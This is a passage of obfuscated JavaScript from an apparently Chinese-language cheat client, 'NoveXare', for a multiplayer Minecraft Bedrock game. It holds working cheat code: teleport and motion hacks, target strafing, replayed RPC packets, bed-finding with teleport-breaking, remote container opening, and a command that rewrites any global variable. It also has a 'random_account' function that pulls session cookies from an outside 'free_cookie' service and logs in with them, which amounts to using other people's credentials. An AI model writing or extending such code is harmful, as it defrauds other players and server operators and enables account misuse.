    let _0x59afa7 = (_0x116e53 ? 0.216 : 0.226) + (boostSpeed ? rocker_speed / 20 : 0);
    let _0x3a412d = (_0x116e53 ? 0.2805 : 0.293) + (boostSpeed ? rocker_speed / 20 : 0);
    if (_0x5306ee >= 180) {
      _0x5306ee -= 360;
    }
    if (_0x5306ee <= -180) {
      _0x5306ee += 360;
    }
    let _0x5b5bfc = {};
    if (targetStrafe && target_list.length > 0 && getDistanceByID(self_id, target_list[0]) <= targetStrafe_distance * 2) {
      let _0x44210 = getPlayerAngle(self_id, target_list[0], "yaw_pos");
      let _0x7a7666 = getPlayerAngle(self_id, target_list[0], "yaw_rot");
      let _0x566ea9 = _0x7a7666 > -90 || _0x7a7666 < 90 ? rocker_speed : -rocker_speed;
      let _0x1ad32b = _0x5306ee > -90 || _0x5306ee < 90 ? rocker_speed : -rocker_speed;
      let _0x48b55d = targetStrafe_relative ? _0x566ea9 : _0x1ad32b;
      Angel = rocker_func.angle > 450 - targetStrafe_range && rocker_func.angle <= targetStrafe_range + 180 || rocker_func.angle > 180 - targetStrafe_range && rocker_func.angle <= targetStrafe_range - 90 ? _0x44210 -= _0x48b55d * 5 : _0x44210 += _0x48b55d * 5;
      if (_0x44210 > 180) {
        _0x44210 -= 360;
      }
      if (_0x44210 < -180) {
        _0x44210 += 360;
      }
      var _0x1410fb = {
        yaw: _0x44210,
        pitch: 0
      };
      let _0x4822ad = getDisplacement(targetStrafe_distance, getEntityPos(target_list[0]), _0x1410fb);
      let _0x56d87a = getPlayerAngle(_0x4822ad, self_id, "yaw_pos");
      var _0x4bf227 = {
        yaw: _0x56d87a,
        pitch: 0
      };
      _0x5b5bfc = getDisplacement(imitateMove ? func_mode.move_mode == 0 ? _0x59afa7 : _0x3a412d : rocker_speed / 8, _0x181abc, _0x4bf227);
    } else {
      var _0x241657 = {
        yaw: _0x5306ee,
        pitch: 0
      };
      _0x5b5bfc = getDisplacement(imitateMove ? func_mode.move_mode == 0 ? _0x59afa7 : _0x3a412d : rocker_speed / 8, _0x181abc, _0x241657);
    }
    if (func_mode.rocker_mode == 1) {
      setPos(_0x5b5bfc.x, _0x181abc.y, _0x5b5bfc.z);
    }
    if (func_mode.rocker_mode == 0) {
      setMotion(_0x5b5bfc.x - _0x181abc.x, rocker_bhop && _0x116e53 && _0x2a3617.y.toFixed(4) == -0.0784 || rocker_ahop && _0x2a3617.y < -0.4 ? rocker_bhop_heigh : _0x2a3617.y, _0x5b5bfc.z - _0x181abc.z);
    }
    rocker_func = {};
  }
  if (airjump_func.operation != undefined) {
    const _0x24c449 = getEntityPos(self_id);
    const _0x3434ca = getEntityMotion(self_id);
    if (airjump_func.operation == "up") {
      if (func_mode.rocker_mode == 1) {
        setPos(_0x24c449.x, _0x24c449.y + rocker_bhop_heigh, _0x24c449.z);
      }
      if (func_mode.rocker_mode == 0) {
        setMotion(_0x3434ca.x, rocker_bhop_heigh, _0x3434ca.z);
      }
    }
    if (airjump_func.operation == "down") {
      if (func_mode.rocker_mode == 1) {
        setPos(_0x24c449.x, _0x24c449.y - rocker_bhop_heigh, _0x24c449.z);
      }
      if (func_mode.rocker_mode == 0) {
        setMotion(_0x3434ca.x, -rocker_bhop_heigh, _0x3434ca.z);
      }
    }
    airjump_func = {};
  }
  if (balance_timer || balance_timer_st) {
    _0x2c4c04.push("§rTimerTick §7>>> §r" + balance_timer_t + "tick");
    if (balance_timer_t <= 0 && balance_timer_st) {
      callModule(30, "{\"value\":false}");
      balance_timer_st = false;
    } else if (balance_timer_t > 0) {
      setPos(self_pos.x, self_pos.y, self_pos.z);
    }
  }
  if (!balance_timer && balance_timer_t > 0 && balance_timer_st) {
    balance_timer_t--;
  }
  if (FakeTip) {
    switch (func_mode.fakeTip_mode) {
      case 0:
        showTipMessage("§bProtoHax §r| " + _0x2ee94b.toFixed(2) + " §eBlocks/sec");
        break;
      case 1:
        if (tip_t1 > 200) {
          curl_get("https://v1.jinrishici.com/jieri/chunjie", {}, (_0x4b7f02, _0xb1147b) => globalThis.current_poem = JSON.parse(_0xb1147b).content);
          tip_t1 = 0;
        }
        showTipMessage("[§bCheat§ePlugin§r] " + current_poem);
        break;
      case 5:
        showTipMessage("Ping: " + ping + "ms Speed: " + _0x2ee94b.toFixed(2) + "B/S CPS: " + Math.round((attack_frequency - empty_attack_frequency) / attack_ticks * 20));
        break;
    }
  }
  if (_0x2c4c04.length > 0 && !FakeTip) {
    showTipMessage("§3§l[NoveXare] §r§7>>> §r" + _0x2c4c04.join(",\n"));
  }
  if (last_tick_id != self_id) {
    last_tick_id = self_id;
  }
  if (fakelag) {
    lag_t++;
  }
  if (cleaner) {
    drop_delay_t++;
  }
  if (godmode) {
    gm_tick++;
  }
  if (fast_build && build_list.length > 0) {
    build_t++;
  }
  if (rgb_t >= rgb_cycle) {
    rgb_l++;
    rgb_t = 0;
  }
  if (rgb_l >= rgb_color.length) {
    rgb_l = 0;
  }
  if (attack_tick > 20 && gradual_up) {
    attack_sound_level = 0;
  }
  if (isAttacking) {
    attack_ticks++;
    isAttacking = false;
  }
  attack_tick++;
  shift_tick_r++;
  if (select_hotbar) {
    select_t++;
  }
  if (circulateSender) {
    rpc_t++;
  }
  if (InfiniteAura) {
    InfiniteAura_switch_delay_r++;
  }
  if (autoarmor && !StartArmor) {
    armor_slot++;
  }
  if (FakeTip && func_mode.fakeTip_mode == 1) {
    tip_t1++;
  }
  if (select_t > select_delay) {
    select_slot++;
    select_t = 0;
  }
  if (select_slot > 8) {
    select_slot = 0;
  }
  if (armor_slot > 8) {
    armor_slot = 0;
  }
  if (target_list.length > 0 && InfiniteAura_list == 0 && InfiniteAura_switch_delay > 0) {
    InfiniteAura_list = target_list;
  }
  if (InfiniteAura_switch_delay_r > InfiniteAura_switch_delay && InfiniteAura_list.length > 0) {
    InfiniteAura_target[0] = InfiniteAura_list[0];
    InfiniteAura_list.shift();
    InfiniteAura_switch_delay_r = 0;
  }
  if (balance_timer && !balance_timer_st) {
    balance_timer_t++;
  }
  calculate_t++;
  tickCounter++;
  action_tick++;
  rgb_t++;
  seconds = Math.floor(ticks / 20);
  ticks++;
  t_b++;
  t_c++;
  switch_delay_t++;
  derp_p_r -= random_rot ? getRandomNum(-10, 10) : head_rot_speed * 2;
  derp_y_r += random_rot ? getRandomNum(-10, 10) : body_rot_speed * 2;
  if (derp_p_r < -90) {
    derp_p_r = -derp_p_r - 90;
  }
  if (derp_y_r > 180) {
    derp_y_r = derp_y_r - 180;
  }
  if (!head_rot) {
    derp_p_r = _0x513051.pitch;
  }
  if (!body_rot) {
    derp_y_r = _0x513051.yaw;
  }
  if (lock_head) {
    derp_p_r = 90;
  }
  last_tick_pos = self_pos;
  last_tick_item = _0x2ecb85;
  last_tick_heal = _0x5c8ff1.current;
};
globalThis.onExecuteCommandEvent = function (_0x154388) {
  if (show_activity) {
    sendChatMessage("我正在执行命令");
  }
  if (show_command) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r ExecuteCMD §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x154388);
  }
  const _0x36d630 = _0x154388.split(" ");
  if (_0x36d630[0] == "/set" && _0x36d630[1] == "pos") {
    var _0x109c4e = {};
    _0x109c4e.x = Number(_0x36d630[2]);
    _0x109c4e.y = Number(_0x36d630[3]);
    _0x109c4e.z = Number(_0x36d630[4]);
    goto_pos = _0x109c4e;
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已设置目标坐标");
    }
    return true;
  }
  if (_0x36d630[0] == "/set" && _0x36d630[1] == "default" && _0x36d630[2] == "config") {
    if (_0x36d630[3] == "clear") {
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已清除默认配置");
      }
      setData("default_config", "null");
      return true;
    }
    if (readFile(config_path + "/" + _0x36d630[3] + ".json") != "{}") {
      setData("default_config", _0x36d630[3]);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已设置默认配置 - " + _0x36d630[3]);
      }
    } else if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "文件为空或不存在 - " + _0x36d630[3]);
    }
    return true;
  }
  if (_0x36d630[0] == "/set" && _0x36d630[1] == "level") {
    setEntityAttribute(self_id, "minecraft:player.level", {
      current: Number(_0x36d630[2])
    });
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已设置经验值");
    }
    return true;
  }
  if (_0x36d630[0] == "/target") {
    if (_0x36d630[1] == "self") {
      target_list[0] = self_id;
    }
    if (_0x36d630[1] == "player") {
      target_list = getPlayerList();
    }
    if (_0x36d630[1] == "all") {
      target_list = getEntityList();
    }
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已设置" + target_list.length + "个目标");
    }
    return true;
  }
  if (_0x36d630[0] == "/cleaner") {
    if (_0x36d630[1] == "reload") {
      clear_config = JSON.parse(readFile(cleaner_path));
    }
    if (_0x36d630[1] == "load") {
      clear_config = JSON.parse(readFile(_0x36d630[2]));
    }
  }
  if (_0x36d630[0] == "/bind") {
    if (_0x36d630[1] === "key" && globalThis[_0x36d630[2]] != undefined) {
      isBinding = _0x36d630[2];
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "按下任意按键与" + _0x36d630[2] + "绑定");
      }
      return true;
    }
    if (bind_func[_0x36d630[1]] == undefined) {
      bind_func[_0x36d630[1]] = [];
    }
    if (globalThis[_0x36d630[2]] != undefined && globalThis[_0x36d630[1]] != undefined) {
      bind_func[_0x36d630[1]].push(_0x36d630[2]);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "绑定 " + _0x36d630[1] + " 与 " + _0x36d630[2] + " 成功");
      }
      NoveXare_Config.binds = bind_func;
    } else if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "功能Key不存在");
    }
    return true;
  }
  if (_0x36d630[0] == "/unbind") {
    if (_0x36d630[1] === "key" && globalThis[_0x36d630[2]] != undefined) {
      for (let _0x4a5748 in key_bind_list) {
        if (key_bind_list[_0x4a5748] == _0x36d630[2]) {
          delete key_bind_list[_0x4a5748];
          break;
        }
      }
      isBinding = _0x36d630[2];
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "解除" + _0x36d630[2] + "的按键绑定");
      }
      return true;
    }
    if (bind_func[_0x36d630[1]] == undefined) {
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "该功能没有绑定任何功能");
      }
      return true;
    }
    if (globalThis[_0x36d630[1]] != undefined && _0x36d630[2] == "all") {
      delete bind_func[_0x36d630[1]];
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "解除 " + _0x36d630[1] + " 的所有绑定");
      }
      NoveXare_Config.binds = bind_func;
      return true;
    }
    if (_0x36d630[1] == "all") {
      bind_func = {};
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "解除所有功能绑定");
      }
      NoveXare_Config.binds = bind_func;
      return true;
    }
    if (globalThis[_0x36d630[2]] != undefined && globalThis[_0x36d630[1]] != undefined) {
      bind_func[_0x36d630[1]].splice(bind_func[_0x36d630[1]].indexOf(_0x36d630[2]), 1);
      if (bind_func[_0x36d630[1]].length == 0) {
        delete bind_func[_0x36d630[1]];
      }
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "解除绑定 " + _0x36d630[1] + " 和 " + _0x36d630[2] + " 成功");
      }
      NoveXare_Config.binds = bind_func;
    } else if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "功能Key不存在");
    }
    return true;
  }
  if (_0x36d630[0] == "/nx") {
    if (globalThis[_0x36d630[2]] == undefined) {
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "变量不存在");
      }
      return true;
    }
    if (_0x36d630[1] == "num") {
      globalThis[_0x36d630[2]] = Number(_0x36d630[3]);
    }
    if (_0x36d630[1] == "bool") {
      globalThis[_0x36d630[2]] = Boolean(_0x36d630[3]);
    }
    if (_0x36d630[1] == "str") {
      globalThis[_0x36d630[2]] = _0x36d630[3];
    }
    if (_0x36d630[1] == "arr") {
      globalThis[_0x36d630[2]] = str2obj(_0x36d630[3]);
    }
    if (_0x36d630[1] == "obj") {
      globalThis[_0x36d630[2]] = JSON.parse(_0x36d630[3]);
    }
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + globalThis[_0x36d630[2]] + " ==> " + _0x36d630[2]);
    }
    return true;
  }
  if (_0x36d630[0] == "/reload") {
    if (_0x36d630[1] == "ui") {
      for (let _0x255b0e of current_ui.ui) {
        if (!_0x255b0e.includes("NoveXare")) {
          continue;
        }
        const _0x5c8eb2 = readFile(getResource() + "/ui/" + _0x255b0e + ".json");
        removeMenu(_0x255b0e);
        setTimeout(() => loadMenu(_0x255b0e, _0x5c8eb2), 500);
      }
    }
    if (_0x36d630[1] == "js") {
      exit();
      loadScript("NoveXare.js");
    }
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已重新加载" + _0x36d630[1]);
    }
    return true;
  }
};
globalThis.onCommandOutputEvent = function (_0x5d9dc0, _0x588dff, _0x1634d8) {
  if (show_send_command) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + string_format("类型:§e{} §r结果:§e{} §r数据:§e{}", _0x5d9dc0, _0x1634d8, JSON.stringify(_0x588dff, null, 2)));
  }
  if (kickaura) {
    return true;
  }
};
globalThis.onCallModuleEvent = function (_0x3215da) {
  if (XxxGBRCxxX[username][pwd][device] != "你觉得验证成功了就是成功了") {
    return true;
  }
  if (show_activity) {
    sendChatMessage("我正在调用UI");
  }
  if (pvp_dalao) {
    setTitle("又或是红石大佬");
  }
  if (show_ui_event) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r UI - Data §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + JSON.stringify(_0x3215da, null, 2));
  }
  if (_0x3215da.name == undefined) {
    if (rocker && _0x3215da.angle != undefined) {
      rocker_func = _0x3215da;
    }
    if (rocker && _0x3215da.operation != undefined) {
      airjump_func = _0x3215da;
    }
    return;
  }
  if (_0x3215da.fun == "fun_hitbox" && _0x3215da.size != undefined) {
    temp_size = {
      x: _0x3215da.size,
      y: _0x3215da.size
    };
  }
  if (target_list.length > 0 && _0x3215da.fun == "fun_hitbox" && _0x3215da.value) {
    default_size = temp_size;
  }
  if (!_0x3215da.name.includes("NoveXare") && _0x3215da.fun != "fun_ride_flying") {
    return;
  }
  if (_0x3215da.sauth_login != undefined && _0x3215da.sauth_login != "") {
    var _0x33622b = {
      bodyReplace: false,
      requestBody: _0x3215da.sauth_login
    };
    let _0x3bf864 = _0x33622b;
    write_file(getResource() + "/ui/conf_sauth_login.json", JSON.stringify(_0x3bf864));
    _0x3bf864.bodyReplace = true;
    callModule(72, JSON.stringify(_0x3bf864));
    return;
  }
  for (key in _0x3215da) {
    if (key == "value" || key == "fun" || key == "name" || key == "index" || key == "shortcut") {
      continue;
    }
    if (_0x3215da.key === "getBed" || key == "getBed") {
      let _0x1bbbc0 = new Set();
      let _0x262cee = getWorldPlayerList();
      for (let _0x48b95f of _0x262cee) {
        let _0x49c01a = getTeams(getEntityName(_0x48b95f.id));
        if (_0x49c01a === "NoveXare") {
          continue;
        }
        let _0x4173ce = getPlayerBlockPos(_0x48b95f.id);
        let {
          x: _0x11553f,
          y: _0x83b298,
          z: _0x375bee
        } = _0x4173ce;
        for (let _0x360a25 = -10; _0x360a25 <= 10; _0x360a25++) {
          for (let _0x3d0311 = -5; _0x3d0311 < 5; _0x3d0311++) {
            for (let _0x3d9eb7 = -10; _0x3d9eb7 <= 10; _0x3d9eb7++) {
              let _0xefd4f1 = _0x11553f + _0x360a25;
              let _0x4ee419 = _0x83b298 + _0x3d0311;
              let _0x3b6e92 = _0x375bee + _0x3d9eb7;
              let _0x486a55 = getBlock(_0xefd4f1, _0x4ee419, _0x3b6e92);
              if (_0x486a55.namespace === "minecraft:bed" && !_0x1bbbc0.has(_0x49c01a)) {
                _0x1bbbc0.add(_0x49c01a);
                var _0x339fa2 = {
                  x: _0xefd4f1,
                  y: _0x4ee419,
                  z: _0x3b6e92
                };
                var _0x38a440 = {
                  player_team: _0x49c01a,
                  pos: _0x339fa2
                };
                bed_list.push(_0x38a440);
              }
            }
          }
        }
      }
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r BedList §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 已获取床坐标 共" + bed_list.length + "条");
      }
    }
    if (_0x3215da.key == "InfiniteBreak" || key == "InfiniteBreak") {
      if (bed_list.length == 0) {
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 请先获取床的坐标");
        }
        return;
      }
      var _0x4d6364 = {
        type: "form",
        title: "队伍列表",
        content: "请选择需要拆除的床",
        buttons: [{
          text: "没有队伍信息"
        }]
      };
      const _0x4ee7e8 = getEntityMotion(self_id);
      const _0x3499b3 = getEntityPos(self_id);
      for (let _0x17b56a in bed_list) {
        _0x4d6364.buttons[_0x17b56a] = {
          text: "§b" + bed_list[_0x17b56a].player_team + " §r§e坐标:" + JSON.stringify(bed_list[_0x17b56a].pos, null, 2)
        };
      }
      addForm(JSON.stringify(_0x4d6364), function (_0x45e121) {
        var _0x26c1a1 = bed_list[_0x45e121];
        var _0x3dd18a = _0x26c1a1.pos;
        callModule(35, "{\"value\":true,\"count\":10}");
        addTP(_0x3dd18a.x, _0x3dd18a.y, _0x3dd18a.z, 5);
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 已传送至 " + _0x26c1a1.player_team);
        }
      });
    }
    if (_0x3215da.key === "team" || _0x3215da.key === "text" || key === "team" || key === "text") {
      EditValue(_0x3215da.key, _0x3215da.key === "team" ? team : text);
    }
    if (_0x3215da.key === "add_item" || key === "add_item") {
      const _0x237c74 = getEntityCarriedItem(self_id);
      const _0x4a0d29 = JSON.parse(readFile(cleaner_path));
      var _0x3f83ed = {
        namespace: _0x237c74.namespace,
        aux: _0x237c74.aux,
        max_num: _0x237c74.count
      };
      _0x4a0d29.push(_0x3f83ed);
      write_file(cleaner_path, JSON.stringify(_0x4a0d29, null, 4));
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddItem §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x237c74.name);
      }
    }
    if (_0x3215da.key === "content" || key === "content") {
      EditValue(_0x3215da.key, content);
    }
    if (_0x3215da.key === "edit_kickaura" || key === "edit_kickaura") {
      EditValue(_0x3215da.key, edit_kickaura);
    }
    if (_0x3215da.key === "particle_type" || key === "particle_type") {
      EditValue(_0x3215da.key, particle_type);
    }
    if (_0x3215da.key === "line_particle_type" || key === "line_particle_type") {
      EditValue(_0x3215da.key, line_particle_type);
    }
    if (_0x3215da.key === "attack_particle_type" || key === "attack_particle_type") {
      EditValue(_0x3215da.key, attack_particle_type);
    }
    if (_0x3215da.key === "arrow_particle_type" || key === "arrow_particle_type") {
      EditValue(_0x3215da.key, arrow_particle_type);
    }
    if (_0x3215da.key === "surround_particle_type" || key === "surround_particle_type") {
      EditValue(_0x3215da.key, surround_particle_type);
    }
    if (_0x3215da.key === "throwable_particle_type" || key === "throwable_particle_type") {
      EditValue(_0x3215da.key, throwable_particle_type);
    }
    if (_0x3215da.key === "attack_sound_type" || key === "attack_sound_type") {
      EditValue(_0x3215da.key, attack_sound_type);
    }
    if (_0x3215da.key === "surround_sound_type" || key === "surround_sound_type") {
      EditValue(_0x3215da.key, surround_sound_type);
    }
    if (_0x3215da.key === "attack_sound_level" || key === "attack_sound_level") {
      EditValue(_0x3215da.key, attack_sound_level);
    }
    if (_0x3215da.key === "edit_action_id" || key === "edit_action_id") {
      EditValue(_0x3215da.key, edit_action_id);
    }
    if (_0x3215da.key === "surround_sound_level" || key === "surround_sound_level") {
      EditValue(_0x3215da.key, surround_sound_level);
    }
    if (_0x3215da.key === "edit_suffix" || key === "edit_suffix") {
      EditValue(_0x3215da.key, edit_suffix);
    }
    if (_0x3215da.key === "scaffold_sword" || key === "scaffold_sword") {
      callModule(37, "{\"value\":true\"}");
      setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 500);
      setTimeout(() => callModule(37, "{\"value\":false\"}"), 1000);
    }
    if (_0x3215da.key === "drop_inv" || key === "drop_inv") {
      for (let _0x308aee = 0; _0x308aee < 36; _0x308aee++) {
        const _0x1cc2f2 = getPlayerInventoryItem(self_id, _0x308aee);
        if (_0x1cc2f2.namespace == "minecraft:air") {
          continue;
        }
        if (_0x1cc2f2.count < 1) {
          continue;
        }
        for (let _0x561b19 = 0; _0x561b19 < _0x1cc2f2.count; _0x561b19++) {
          drop_list.push(_0x308aee);
        }
      }
    }
    if (_0x3215da.key === "look_tp" || key === "look_tp") {
      var _0x2f132d = {};
      for (let _0x3d3317 = 0; _0x3d3317 < 500; _0x3d3317++) {
        _0x2f132d = getDisplacement(_0x3d3317, getEntityPos(self_id), getEntityRot(self_id));
        const _0x10ad8c = getBlock(_0x2f132d.x, _0x2f132d.y, _0x2f132d.z);
        if (_0x10ad8c.namespace != "minecraft:air") {
          break;
        }
      }
      if (_0x2f132d != {}) {
        const _0x10a440 = getEntityPos(self_id);
        if (func_mode.look_tp_mode == 0) {
          Teleport(_0x2f132d.x, _0x2f132d.y + 1.53, _0x2f132d.z);
        }
        if (func_mode.look_tp_mode == 1) {
          setPos(_0x2f132d.x, _0x2f132d.y + 1.53, _0x2f132d.z);
        }
      }
    }
    if (_0x3215da.key === "open_chest" || key === "open_chest") {
      var _0x47de4b = {
        type: "form",
        title: "容器列表",
        content: "请选择需要打开的容器",
        buttons: [{
          text: "暂无容器"
        }]
      };
      var _0x2b9125 = [];
      var _0x5286e6 = 0;
      var _0x420cfc = getPlayerBlockPos(self_id);
      const _0x208a79 = ["minecraft:barrel", "minecraft:chest", "minecraft:trapped_chest"];
      const _0x143ed1 = "shulker_box";
      for (let _0x48f062 = -7; _0x48f062 < 7; _0x48f062++) {
        for (let _0x3f540c = -7; _0x3f540c < 7; _0x3f540c++) {
          for (let _0x458e3e = -7; _0x458e3e < 7; _0x458e3e++) {
            const _0x15df21 = _0x48f062 + _0x420cfc.x;
            const _0x43d2a9 = _0x3f540c + _0x420cfc.y;
            const _0x3e0c77 = _0x458e3e + _0x420cfc.z;
            const _0x55c0ee = getBlock(_0x15df21, _0x43d2a9, _0x3e0c77);
            if (_0x208a79.includes(_0x55c0ee.namespace) || _0x55c0ee.namespace.includes(_0x143ed1)) {
              const _0x4454b6 = getBlock(_0x15df21, _0x43d2a9 + 1, _0x3e0c77);
              var _0x1e59e4 = {
                text: "命名空间: " + _0x55c0ee.namespace + "\n坐标:   " + (_0x4454b6.namespace == "minecraft:air" ? "" : " §c=>§e 容器顶上存在方块")
              };
              _0x47de4b.buttons[_0x5286e6] = _0x1e59e4;
              var _0x388fed = {
                x: _0x15df21,
                y: _0x43d2a9,
                z: _0x3e0c77
              };
              _0x2b9125[_0x5286e6] = _0x388fed;
              _0x5286e6++;
            }
          }
        }
      }
      if (_0x5286e6 == 0) {
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 暂无容器");
        }
        return;
      }
      addForm(JSON.stringify(_0x47de4b), function (_0x41d498) {
        var _0x46c099 = _0x2b9125[_0x41d498];
        buildBlock(self_id, _0x46c099.x, _0x46c099.y, _0x46c099.z, 1);
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 已打开该容器");
        }
      });
    }
    if (_0x3215da.key === "y_up" || key === "y_up") {
      setMotion(0, up_down_speed, 0);
    }
    if (_0x3215da.key === "random_account" || key === "random_account") {
      curl_get("http://api.alexblock.org/free_cookie/get", {}, (_0x1d9e13, _0x158d94) => {
        var _0x3b6edd = JSON.parse(_0x158d94);
        var _0xa4c0dc = {
          sauth_json: _0x3b6edd.cookie.sauth_json != undefined ? _0x3b6edd.cookie.sauth_json : _0x3b6edd.cookie
        };
        var _0x50b935 = _0xa4c0dc;
        var _0x1e58c9 = {
          bodyReplace: false
        };
        _0x1e58c9.requestBody = JSON.stringify(_0x50b935);
        var _0x458a4d = _0x1e58c9;
        write_file(getResource() + "/ui/conf_sauth_login.json", JSON.stringify(_0x458a4d));
        _0x458a4d.bodyReplace = true;
        callModule(72, JSON.stringify(_0x458a4d));
      });
      return;
    }
    if (_0x3215da.key === "y_down" || key === "y_down") {
      setMotion(0, -up_down_speed, 0);
    }
    if (_0x3215da.key === "RepeatRpc" || key === "RepeatRpc") {
      for (let _0x519419 = 0; _0x519419 < RepeatRpc_times; _0x519419++) {
        sendRpc(last_PyRpc.id, last_PyRpc.data);
      }
    }
    if (_0x3215da.key === "replace_cmd" || key === "replace_cmd") {
      EditValue(_0x3215da.key, replace_cmd);
    }
    if (_0x3215da.key === "keyword" || key === "keyword") {
      EditValue(_0x3215da.key, keyword);
    }
    if (_0x3215da.key === "tip_keyword" || key === "keywordtip_keyword") {
      EditValue(_0x3215da.key, tip_keyword);
    }
    if (_0x3215da.key === "send_keyword" || key === "send_keyword") {
      EditValue(_0x3215da.key, send_keyword);
    }
    if (_0x3215da.key == "attack_self_one" || key == "attack_self_one") {
      attack(self_id, attack_action);
    }
    if (_0x3215da.key == "remove_self" || key == "remove_self") {
      removeEntity(self_id);
    }
    if (_0x3215da.key === "chat_keyword" || key === "chat_keyword") {
      EditValue(_0x3215da.key, chat_keyword);
    }
    if (_0x3215da.key === "receive_keyword" || key === "receive_keyword") {
      EditValue(_0x3215da.key, receive_keyword);
    }
    if (_0x3215da.key === "keyword2" || key === "keyword2") {
      EditValue(_0x3215da.key, keyword2);
    }
    if (_0x3215da.key === "select_hotbar_items" || key === "select_hotbar_items") {
      EditValue("selectitems", selectitems);
    }
    if (_0x3215da.key === "send_keyword2" || key === "send_keyword2") {
      EditValue(_0x3215da.key, send_keyword2);
    }
    if (_0x3215da.key === "receive_keyword2" || key === "receive_keyword2") {
      EditValue(_0x3215da.key, receive_keyword2);
    }
    if (_0x3215da.key === "entity_keyword" || key === "entity_keyword") {
      EditValue(_0x3215da.key, entity_keyword);
    }
    if (_0x3215da.key === "SearchModule" || key === "SearchModule") {
      addForm("{\"type\":\"custom_form\",\"title\":\"搜索功能\",\"content\":[{\"type\":\"input\",\"text\":\"功能名或者功能Key\",\"placeholder\":\"assistaim或自动瞄准\",\"default\":\"\"},{\"type\": \"toggle\",\"text\": \"模糊搜索\",\"default\": true}]}", function (_0x4c90a2, _0x197381) {
        var _0x5ed0b4 = {
          type: "Menu",
          color: "#d2000000",
          alpha: 0.95,
          can_close: true,
          title: {
            name: "搜索结果",
            elevation: 0,
            background: "#000000",
            padding: [5, 5, 5, 5],
            margins: [0, 0, 0, 0],
            colors: ["#FFFFFF", "#FFFFFF"]
          },
          params: [-2, -2],
          padding: [3, 0, 3, 0],
          margins: [0, 0, 0, 0],
          show_dividers: true,
          radius: 6,
          hide: false,
          items: [{
            type: "TextView",
            sound: "click.mp3",
            name: "NoveXare功能",
            size: 13,
            color: "#FFFFFF",
            tag: "fun_entity_event_manager",
            padding: [5, 5, 5, 5],
            items: [{
              type: "TextView",
              sound: "click.mp3",
              name: "没有结果",
              color: "#FFFFFF",
              size: 12,
              padding: [5, 5, 5, 5]
            }]
          }]
        };
        var _0x4b3971 = 0;
        var _0x1e37d1 = getResource();
        var _0x3f7a52 = file_list(_0x1e37d1 + "/ui");
        for (var _0x58b42b of _0x3f7a52) {
          if (!_0x58b42b.name.includes("NoveXare")) {
            continue;
          }
          var _0x63879a = JSON.parse(read_file(_0x58b42b.path));
